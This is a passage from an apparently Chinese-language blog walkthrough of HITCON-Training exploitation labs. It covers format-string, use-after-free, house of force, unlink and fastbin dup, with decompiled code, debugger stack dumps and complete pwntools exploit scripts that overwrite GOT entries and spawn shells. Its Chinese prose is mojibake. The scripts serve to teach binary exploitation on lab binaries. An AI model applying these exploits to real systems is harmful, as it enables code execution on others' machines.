class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²å­˜åœ¨bssæ®µï¼Œä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼Œéœ€è¦åœ¨stackä¸Šæ‰¾ä¸€å¯¹æŒ‡å‘stackçš„åœ°å€ä»¥åŠä¸€å¯¹æŒ‡å‘elf.codeæ®µçš„ï¼ˆæœ‰dataæ®µæ›´å¥½ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ esp  0xffffd480 â€”â–¸ 0x804a060 (buf) â—‚â€” &apos;123\n&apos;</span><br><span class="line">01:0004â”‚      0xffffd484 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008â”‚      0xffffd488 â—‚â€” 0x4</span><br><span class="line">03:000câ”‚      0xffffd48c â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x10</span><br><span class="line">04:0010â”‚      0xffffd490 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014â”‚      0xffffd494 â€”â–¸ 0xf7fb8000 â—‚â€” 0x1b1db0</span><br><span class="line">06:0018â”‚ ebp  0xffffd498 â€”â–¸ 0xffffd4a8 â€”â–¸ 0xffffd4b8 â—‚â€” 0x0</span><br><span class="line">07:001câ”‚      0xffffd49c â€”â–¸ 0x8048584 (play+59) â—‚â€” nop   step3:æœ€åæŒ‡å‘printf@got</span><br><span class="line">08:0020â”‚      0xffffd4a0 â€”â–¸ 0xf7fb8d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">09:0024â”‚      0xffffd4a4 â—‚â€” 0x0</span><br><span class="line">0a:0028â”‚      0xffffd4a8 â€”â–¸ 0xffffd4b8 â—‚â€” 0x0</span><br><span class="line">0b:002câ”‚      0xffffd4ac â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop   step3:æœ€åæŒ‡å‘printf@got+2</span><br><span class="line">0c:0030â”‚      0xffffd4b0 â€”â–¸ 0xf7fb83dc â€”â–¸ 0xf7fb91e0 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">12:0048â”‚      0xffffd4c8 â—‚â€” 0x0</span><br><span class="line">13:004câ”‚      0xffffd4cc â€”â–¸ 0xf7e1e637 (__libc_start_main+247) â—‚â€” add    esp, 0x10</span><br><span class="line">14:0050â”‚      0xffffd4d0 â—‚â€” 0x1</span><br><span class="line">15:0054â”‚      0xffffd4d4 â€”â–¸ 0xffffd564 â€”â–¸ 0xffffd6c3 â—‚â€” 0x6d6f682f (&apos;/hom&apos;)  step1:è¿™ä¸ªç”¨æ¥åšè·³æ¿1</span><br><span class="line">16:0058â”‚      0xffffd4d8 â€”â–¸ 0xffffd56c â€”â–¸ 0xffffd6ef â—‚â€” &apos;USER=kira&apos;          step1:è¿™ä¸ªç”¨æ¥åšè·³æ¿2</span><br><span class="line">17:005câ”‚      0xffffd4dc â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">37:00dcâ”‚      0xffffd55c â€”â–¸ 0xf7ffd918 â—‚â€” 0x0</span><br><span class="line">38:00e0â”‚      0xffffd560 â—‚â€” 0x1</span><br><span class="line">39:00e4â”‚      0xffffd564 â€”â–¸ 0xffffd6c3 â—‚â€” 0x6d6f682f (&apos;/hom&apos;)  step2:æŒ‡å‘æœ€åæŒ‡å‘printf@gotçš„åœ°å€</span><br><span class="line">3a:00e8â”‚      0xffffd568 â—‚â€” 0x0</span><br><span class="line">3b:00ecâ”‚      0xffffd56c â€”â–¸ 0xffffd6ef â—‚â€” &apos;USER=kira&apos;          step2:æŒ‡å‘æœ€åæŒ‡å‘printf@got+2çš„åœ°å€</span><br><span class="line">3c:00f0â”‚      0xffffd570 â€”â–¸ 0xffffd6f9 â—‚â€” &apos;LOGNAME=kira&apos;</span><br></pre></td></tr></table></figure></p><p>è§‚å¯Ÿstackæƒ…å†µï¼ŒæŒ‘é€‰æ ‡è®°é‚£4ä¸ªåœ°å€ä½¿ç”¨<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hhn</span><span class="params">(addr,offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%&#123;addr&#125;c%&#123;offset&#125;$hhn"</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hn</span><span class="params">(addr,offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%&#123;addr&#125;c%&#123;offset&#125;$hn"</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gogogo</span></span><br><span class="line">p.send(<span class="string">'start'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'start'</span>)</span><br><span class="line"><span class="comment">#step1</span></span><br><span class="line">p.sendline(<span class="string">'%6$p..%15$p..step1\x00'</span>)</span><br><span class="line">esp_addr = int(p.recvuntil(<span class="string">'..'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>) - <span class="number">0x28</span></span><br><span class="line">success(<span class="string">'esp_addr:&#123;:#x&#125;'</span>.format(esp_addr))</span><br><span class="line">libc_start_main_247 = int(p.recvuntil(<span class="string">'..'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = libc_start_main_247 - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">247</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment">#step2</span></span><br><span class="line">payload = hn((esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>,<span class="number">0x15</span>)</span><br><span class="line">payload += hn(((esp_addr+<span class="number">0x2c</span>)&amp;<span class="number">0xffff</span>-(esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>)%<span class="number">0xffff</span>,<span class="number">0x16</span>)</span><br><span class="line">payload += <span class="string">'step2\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step1'</span>,payload)</span><br><span class="line"><span class="comment">#step3</span></span><br><span class="line">payload = hn((elf.got[<span class="string">'printf'</span>])&amp;<span class="number">0xffff</span>,<span class="number">0x39</span>)</span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">0x3b</span>)</span><br><span class="line">payload += <span class="string">'step3\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step2'</span>,payload)</span><br><span class="line"><span class="comment">#step4</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload = hhn(libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>,<span class="number">0xb</span>)</span><br><span class="line">payload += hn((libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffff</span>) - (libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">0x7</span>)</span><br><span class="line">payload += <span class="string">'step4\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step3'</span>,payload)</span><br><span class="line"><span class="comment">#step5</span></span><br><span class="line">p.sendlineafter(<span class="string">'step4'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*printnote)();</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>UAFåˆ©ç”¨ï¼Œaddä¸¤ä¸ªå¤§å°32çš„noteï¼Œç„¶åfreeæ‰ï¼Œæ ¹æ®FILOçš„åŸåˆ™ï¼Œé‡æ–°addä¸€ä¸ª8å¤§å°çš„noteï¼Œcontentéƒ¨åˆ†ä¼šç”¨åˆ°ç¬¬0ä¸ªnoteçš„ç»“æ„ä½“ç©ºé—´ï¼Œå°†print_noteè¦†ç›–æˆmagicå³å¯ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"0"</span>)</span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"1"</span>)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(magic))</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸€ï¼š house of force</strong></p><p>åˆ©ç”¨<code>change_item</code>é‡Œé¢ä¿®æ”¹contentå¯ä»¥è‡ªå®šä¹‰é•¿åº¦çš„æ¼æ´ï¼Œä¿®æ”¹<code>top chunk size</code>ï¼Œmallocä¸€ä¸ªå¤§æ•°/è´Ÿæ•°æ¥å®ç°æ§åˆ¶<code>top_chunk</code>çš„æŒ‡é’ˆï¼Œä»è€Œè¾¾åˆ°ä»»æ„åœ°å€å†™ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc(0x10uLL);</span><br><span class="line">*v3 = hello_message;</span><br><span class="line">v3[1] = goodbye_message;</span><br></pre></td></tr></table></figure></p><p>ç¨‹åºåœ¨å¼€å¤´å°†ä¸¤ä¸ªå‡½æ•°åœ°å€æ”¾è¿›heapä¸­ï¼Œå°†<code>goodbye_message</code>æ”¹æˆ<code>magic</code>å³å¯ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">"debug"</span>) </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./bamboobox"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1111"</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)) <span class="comment"># overwrite top chunk size</span></span><br><span class="line">add(<span class="number">-160</span>,<span class="string">"2222"</span>) <span class="comment"># å‡å°top chunkæŒ‡é’ˆ</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>) <span class="comment"># åˆ†é…å—å®ç°ä»»æ„åœ°å€å†™</span></span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><strong>æ–¹æ³•äºŒï¼šunlink</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:0x00000000000000400x000000000063d030 &lt;== ptr</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:0x00000000000000800x000000000063d080 </span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:0x00000000000000400x000000000063d110</span><br><span class="line">-----------------unlinkå-----------------</span><br><span class="line">pwndbg&gt; x/16gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:0x00000000000000400x00000000006020b0 &lt;== ptr</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:0x00000000000000400x000000000063d110</span><br></pre></td></tr></table></figure></p><p>åˆ¶é€ fakechunkï¼Œä¿®æ”¹<code>box0</code>çš„<code>content</code>æŒ‡å‘<code>0x6020c8-0x18</code>ï¼Œæ­¤æ—¶ä¿®æ”¹<code>box0</code>çš„<code>content</code>ï¼Œå°±èƒ½å†™å…¥<code>0x6020b0</code>å¤„ï¼Œæ”¹å†™æˆ<code>atoi@got</code>ï¼Œç„¶åæ³„éœ²åœ°å€å¹¶ä¿®æ”¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>, <span class="string">'0'</span> * <span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span> * <span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">'2'</span> * <span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span> <span class="comment"># box0çš„content</span></span><br><span class="line"></span><br><span class="line">fakeChunk = flat([<span class="number">0</span>, <span class="number">0x41</span>, ptr - <span class="number">0x18</span>, ptr - <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x90</span>])</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x50</span>, fakeChunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x40</span>, elf.got[<span class="string">'atoi'</span>]])</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">show()</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x8</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'$0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab12-secretgarden"><a href="#lab12-secretgarden" class="headerlink" title="lab12-secretgarden"></a>lab12-secretgarden</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ç¨‹åºèœå•å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 . Raise a flower</span><br><span class="line">2 . Visit the garden</span><br><span class="line">3 . Remove a flower from the garden</span><br><span class="line">4 . Clean the garden</span><br><span class="line">5 . Leave the garden</span><br></pre></td></tr></table></figure></p><p>ç»“æ„ä½“å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct flower</span><br><span class="line">&#123;</span><br><span class="line">  __int64 inuse;</span><br><span class="line">  char *name;</span><br><span class="line">  char color[24];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>æ¼æ´ç‚¹åœ¨<code>del()</code>ï¼Œå­˜åœ¨double freeæ¼æ´<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !flowercount )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) ) <span class="comment">//æ²¡æœ‰æ£€æŸ¥inuseæ ‡è®°ä½</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD((*(&amp;flowerlist + v1))-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((*(&amp;flowerlist + v1))-&gt;name);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>é‡‡ç”¨fastbin dupä¿®æ”¹free@gotå³å¯ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raiseflower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(length))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"4"</span>)</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"0"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"1"</span>,<span class="string">"red"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">"blue"</span>) <span class="comment">#0</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"1"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"0"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + p64(magic)*<span class="number">2</span> ,<span class="string">"red"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab13-heapcreator"><a href="#lab13-heapcreator" class="headerlink" title="lab13-heapcreator"></a>lab13-heapcreator</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨<code>edit_heap()</code>ï¼Œç•™æ„ä»¥ä¸‹ä»£ç ï¼Œå‡ºç°äº†off-by-oneæ¼æ´<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( heaparray[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Content of heap : &quot;, &amp;buf);</span><br><span class="line">  read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + 1); //å¤šäº†ä¸€å­—èŠ‚</span><br><span class="line">  puts(&quot;Done !&quot;);</span><br><span 